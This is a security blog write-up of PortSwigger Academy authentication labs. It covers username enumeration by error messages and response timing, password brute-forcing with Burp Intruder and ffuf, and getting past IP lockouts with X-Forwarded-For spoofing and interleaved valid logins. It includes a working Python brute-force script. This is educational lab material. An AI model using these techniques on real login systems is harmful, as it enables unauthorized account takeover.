<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Vulnerable Username-Password Authentication" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme." /><meta property="og:description" content="Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme." /><link rel="canonical" href="https://an9k0r.github.io/posts/Vulnerable_Username_and_Password_Authentication-copy/" /><meta property="og:url" content="https://an9k0r.github.io/posts/Vulnerable_Username_and_Password_Authentication-copy/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-30T09:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Vulnerable Username-Password Authentication" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme.","headline":"Vulnerable Username-Password Authentication","dateModified":"2022-10-11T15:35:20+02:00","url":"https://an9k0r.github.io/posts/Vulnerable_Username_and_Password_Authentication-copy/","datePublished":"2022-09-30T09:00:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/Vulnerable_Username_and_Password_Authentication-copy/"},"@context":"https://schema.org"}</script><title>Vulnerable Username-Password Authentication | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Vulnerable Username-Password Authentication</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Vulnerable Username-Password Authentication</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-09-30 09:00:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Fri, Sep 30, 2022, 9:00 AM +0200" >Sep 30, 2022</em> </span> <span> Updated <em class="timeago" date="2022-10-11 15:35:20 +0200 " data-toggle="tooltip" data-placement="bottom" title="Tue, Oct 11, 2022, 3:35 PM +0200" >Oct 11, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1801 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post/writeup is all about the Authentication vulnerabilities or <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Broken Authentication</a> if we follow <a href="https://owasp.org/">OWASP</a> naming scheme.</p><p>I’ll be using primarily <a href="https://portswigger.net/web-security/authentication">Portswigger Web Academy</a> Labs, but i do intent do throw other labs and writeups here as well.</p><h1 id="theory">Theory</h1><p>For successful authentication (considering we’re not dealing with MFA) we need an username and password. Password usually has to be guessed or brute-forced however username may sometimes be enumerated as well. This may be possible while observing:</p><ul><li>Status Codes<li>Error Messages (in response)<li>Response Times (if application does SQL check for username and password sequentially)</ul><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><a href="#intro">Intro</a><li><a href="#theory">Theory</a><ul><li><a href="#toc">TOC</a></ul><li><a href="#username-enumeration-via-different-responses">Username enumeration via different responses</a><ul><li><a href="#enumeration">Enumeration</a><li><a href="#username-bruteforcing-with-burp-intruder">Username Bruteforcing with Burp Intruder</a><li><a href="#password-bruteforcing-with-ffuf">Password Bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code></a></ul><li><a href="#username-enumeration-via-subtly-different-responses">Username enumeration via subtly different responses</a><ul><li><a href="#username-brute-force-using-intruder-and-grep---extract">Username brute-force using Intruder and Grep - Extract</a><li><a href="#password-brute-force-using-intruder-and-grep---extract">Password brute-force using Intruder and Grep - Extract</a></ul><li><a href="#username-enumeration-via-response-timing">Username enumeration via response timing</a><ul><li><a href="#measuring-response-for-existing-and-non-existing-accounts-with-burp-repeater">Measuring response for existing and non-existing accounts with Burp Repeater</a><li><a href="#brute-force-password">Brute-Force password</a></ul><li><a href="#broken-brute-force-protection-ip-block">Broken brute-force protection, IP block</a><ul><li><a href="#intro-1">Intro</a><li><a href="#trying-simple-password-brute-force">Trying simple password brute-force</a><li><a href="#solution-1---brute-force-using-python-requests">Solution #1 - Brute-force using python requests</a><li><a href="#solution-2---using-burp-intruder-with-customized-username-and-password-lists">Solution #2 - Using Burp Intruder with customized username and password lists.</a><li><a href="#solution-3---brute-force-using-burp-turbo-intruder">Solution #3 - Brute-force using Burp Turbo Intruder</a></ul><li><a href="#username-enumeration-via-account-lock">Username enumeration via account lock</a><li><a href="#broken-brute-force-protection-multiple-credentials-per-request">Broken brute-force protection, multiple credentials per request</a></ul><h1 id="username-enumeration-via-different-responses">Username enumeration via different responses</h1><blockquote><p>This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists: <a href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a> <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a> To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.</p></blockquote><h2 id="enumeration">Enumeration<a href="#enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can see the webpage’s login:</p><p><img data-src="/assets/images/ed2f89dc6333ed3651c8eb143bfd3954de6481c51d031d9a0b862b84ff01f34b.png" alt="picture 36" data-proofer-ignore></p><p>Application throws an error <code class="language-plaintext highlighter-rouge">Invalid Username</code></p><p><img data-src="/assets/images/9daa12d3a39445aa7ba18da99863ba8859c53432e9efcdcd51f0f4e0f680dafa.png" alt="picture 37" data-proofer-ignore></p><h2 id="username-bruteforcing-with-burp-intruder">Username Bruteforcing with Burp Intruder<a href="#username-bruteforcing-with-burp-intruder" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s paste the <a href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a> into Burp’s Intruder:</p><p><img data-src="/assets/images/382a7965940c694ae036d8756a11c5ed811625c734dd9bb4073dd321273a7acd.png" alt="picture 38" data-proofer-ignore></p><p>We’ve found the user, which is <code class="language-plaintext highlighter-rouge">user</code>.</p><p>Let’s bruteforce the password with <code class="language-plaintext highlighter-rouge">ffuf</code></p><h2 id="password-bruteforcing-with-ffuf">Password Bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code><a href="#password-bruteforcing-with-ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ffuf -w portswigger_passwords:FUZZ_PASS  -u "https://0a3e005e03bf0fbac09413a80059004c.web-security-academy.net/login" -d "username=user&amp;password=FUZZ_PASS" --fs 3098
</pre></table></code></div></div><p>Mind that <code class="language-plaintext highlighter-rouge">--fs 3098</code> was added to filter out the requests which return <code class="language-plaintext highlighter-rouge">invalid password</code>. They all have same response size.</p><p><img data-src="/assets/images/1ab428ec4afd128fb3d2f93b99253feec82e9309519d37a52f2a47a96945c8af.png" alt="picture 39" data-proofer-ignore></p><p>Both, username and password have been retrieved. Labb has been solved.</p><p><img data-src="/assets/images/7194fc218858874f87532878610aedcf526d9201fbbaedf1f1d8fa0c989f954b.png" alt="picture 40" data-proofer-ignore></p><h1 id="username-enumeration-via-subtly-different-responses">Username enumeration via subtly different responses</h1><blockquote><p>This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p><p><a href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a></p><p><a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></p><p>To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.</p></blockquote><p>This lab can be bruteforced with just trying every username or password, however we’re supposed to pay attention to <em>subtly different responses</em>.</p><h2 id="username-brute-force-using-intruder-and-grep---extract">Username brute-force using Intruder and Grep - Extract<a href="#username-brute-force-using-intruder-and-grep---extract" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s add <code class="language-plaintext highlighter-rouge">Grep - Export</code>.</p><p><img data-src="/assets/images/38a2296e2b8ae3a5bd003c4370e580f930f442052009d09b8c7a1213f555b5ad.png" alt="picture 41" data-proofer-ignore></p><p>As soon as we highlight <code class="language-plaintext highlighter-rouge">Invalid username or password</code>, parameters will be set automaticaly. Just apply that, set the same username list from portswigger and run the Intruder:</p><p><img data-src="/assets/images/b8180aaebe060ecf4679ecff59891f5b987be0a49710e9b0ef889fffb2634cc1.png" alt="picture 42" data-proofer-ignore></p><p>One request is slightly different - Username: <code class="language-plaintext highlighter-rouge">alerts</code></p><h2 id="password-brute-force-using-intruder-and-grep---extract">Password brute-force using Intruder and Grep - Extract<a href="#password-brute-force-using-intruder-and-grep---extract" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s do the same with the password. Remember to change the password list! <code class="language-plaintext highlighter-rouge">Grep - Extract</code> can stay the same.</p><p>We can notice that <code class="language-plaintext highlighter-rouge">11111111</code> gave us different response and <code class="language-plaintext highlighter-rouge">HTTP 302</code>:</p><p><img data-src="/assets/images/568169da8f9339df262cf52ec643d638244ec894e01cffd0f52596fcb0ebb66f.png" alt="picture 43" data-proofer-ignore></p><p>Lab has been solved</p><p><img data-src="/assets/images/e050b3ff501b65d6c47de9a91aae6173e910402fb5fd3f0101e2a578fc0b3193.png" alt="picture 44" data-proofer-ignore></p><h1 id="username-enumeration-via-response-timing">Username enumeration via response timing</h1><blockquote><p>This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.</p><p>Your credentials: wiener:peter</p></blockquote><p>Here we’ve got an account, so we can measure how long does a query need for existing account and for a non-existing.</p><h2 id="measuring-response-for-existing-and-non-existing-accounts-with-burp-repeater">Measuring response for existing and non-existing accounts with Burp Repeater<a href="#measuring-response-for-existing-and-non-existing-accounts-with-burp-repeater" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/155b764d0fb1664b18b077b515ad727d790405d92ed8de4ba11944d60fe97da1.png" alt="picture 45" data-proofer-ignore></p><p>We have around 10ms difference. Let’s try with the wordlist but watchout:</p><blockquote><p>Error: You have made too many incorrect login attempts. Please try again in 30 minute(s).</p></blockquote><p>We have to take care of the IP-Block, which we can bypass using <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header. We’d use Pitchfork mode for that, so IP and Username change with every cycle!</p><p><img data-src="/assets/images/81dcfd04785dc9a823502064a558cee19c48cac14619b999d0fcd4649ee9b72f.png" alt="picture 46" data-proofer-ignore></p><p>We can see that with <code class="language-plaintext highlighter-rouge">access</code> the difference is even greater, we should however always double-check! ;)</p><p><img data-src="/assets/images/a45d8532d5384070977c8818409162e684cc27e7bb4604091895a0b677c4da0e.png" alt="picture 47" data-proofer-ignore></p><h2 id="brute-force-password">Brute-Force password<a href="#brute-force-password" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Assuming the username really is <code class="language-plaintext highlighter-rouge">access</code> let’s brute-force password.</p><p>Again with using Pitchfork mode and cycling the IPs in <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code></p><p><img data-src="/assets/images/70a35935599abac6fc995cce1013edb69a24815c6b5a4bed49d76cf6cbdcadd9.png" alt="picture 48" data-proofer-ignore></p><p>So there it is, a <code class="language-plaintext highlighter-rouge">sunshine</code> ;).</p><p>This is the problem that i’ve had. I’ll just intercept the request and add some random IP when authenticating as <code class="language-plaintext highlighter-rouge">access:sunshine</code></p><p><img data-src="/assets/images/f2f0441040ae46f29db85fd9c8b341040ffd1c97b6ebf5e13181b304d4cdc946.png" alt="picture 49" data-proofer-ignore></p><p>Lab has been solved:</p><p><img data-src="/assets/images/3b78819400a62f687f5fd54f6dea6185a194096bf619265884c8ecb0364949b2.png" alt="picture 50" data-proofer-ignore></p><h1 id="broken-brute-force-protection-ip-block">Broken brute-force protection, IP block</h1><blockquote><p>This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim’s password, then log in and access their account page. Your credentials: wiener:peter</p><p>Victim’s username: carlos</p><p><a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></p></blockquote><h2 id="intro-1">Intro<a href="#intro-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This would be the second Lab now where we have to bypass the IP block for brute-forcing. Let us get to it. We have a victim <code class="language-plaintext highlighter-rouge">carlos</code> and we have working credentials</p><h2 id="trying-simple-password-brute-force">Trying simple password brute-force<a href="#trying-simple-password-brute-force" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>On the 4th try we get a message that we have to wait a minute before trying again.</p><p><img data-src="/assets/images/7885742dfdf2b33bb7adcc14f9410e144003c2e2232636b9b2f9ce82ed6db6a3.png" alt="picture 51" data-proofer-ignore></p><p>Spoiler Alert: <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> does not help here.</p><p>What however works is:</p><ul><li>1st request = Brute-force password for <code class="language-plaintext highlighter-rouge">carlos</code><li>2nd request = Brute-force password for <code class="language-plaintext highlighter-rouge">carlos</code><li>3rd request = Login with <code class="language-plaintext highlighter-rouge">wiener:peter</code> which resets the counter<li>…repeat</ul><p>My ideas here were create a wordlist for username and password where at every 3rd try is come <code class="language-plaintext highlighter-rouge">wiener:peter</code> credentials.</p><h2 id="solution-1---brute-force-using-python-requests">Solution #1 - Brute-force using python requests<a href="#solution-1---brute-force-using-python-requests" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>In python this is relatively easily scriptable by using 2 for loop cycles.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">requests</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">bruteforce</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">cycles</span><span class="p">,</span> <span class="n">password_list</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">working_credz</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">password_list</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">":"</span> <span class="ow">in</span> <span class="n">password</span><span class="p">:</span>
            <span class="n">credentials_split</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
            <span class="n">password</span> <span class="o">=</span> <span class="n">credentials_split</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
            <span class="n">username</span> <span class="o">=</span> <span class="n">credentials_split</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">username</span><span class="o">=</span><span class="n">username</span>
            <span class="n">password</span><span class="o">=</span><span class="n">password</span>
        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="n">session</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/x-www-form-urlencoded"</span><span class="p">}</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">}</span> 
        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">username</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">working_credz</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"(+) tried %s:%s; Content-Length: %s"</span> <span class="o">%</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">s</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-length'</span><span class="p">]))</span>
            <span class="c1">#print(s.headers)
</span>            <span class="c1">#print(r.text)
</span>    <span class="k">return</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"(!) usage: %s &lt;target&gt; &lt;wordlist&gt; &lt;cycles&gt; &lt;working_credentials&gt; &lt;username&gt;"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"(!) eg: %s https://target.tld/login ./passwords 2 'user:pass' username"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">target</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">wordlist</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">cycles</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
    <span class="n">working_credz</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>
    <span class="n">username</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span>
    
    <span class="k">print</span><span class="p">(</span><span class="s">"(+) Target: %s; Wordlist: %s; Cycles before using working credentials: %s; Working Credentials: '%s'; Bruteforcing user: %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">wordlist</span><span class="p">,</span><span class="n">cycles</span><span class="p">,</span><span class="n">working_credz</span><span class="p">,</span><span class="n">username</span><span class="p">))</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">passwords</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">]</span>
        <span class="c1"># List needs to be initialy set and should be reset every 3rd turn, but this will be done in for loop
</span>        <span class="n">password_list</span><span class="o">=</span><span class="p">[]</span>
        <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
            <span class="n">password_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password_list</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">password_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">working_credz</span><span class="p">)</span>
                <span class="c1">#print("(+) Batch: %s" %(password_list))
</span>                <span class="n">bruteforce_session</span> <span class="o">=</span> <span class="n">bruteforce</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">cycles</span><span class="p">,</span> <span class="n">password_list</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">working_credz</span><span class="p">)</span>
                <span class="n">password_list</span><span class="o">=</span><span class="p">[]</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">continue</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">(+) All passwords have been checked!"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

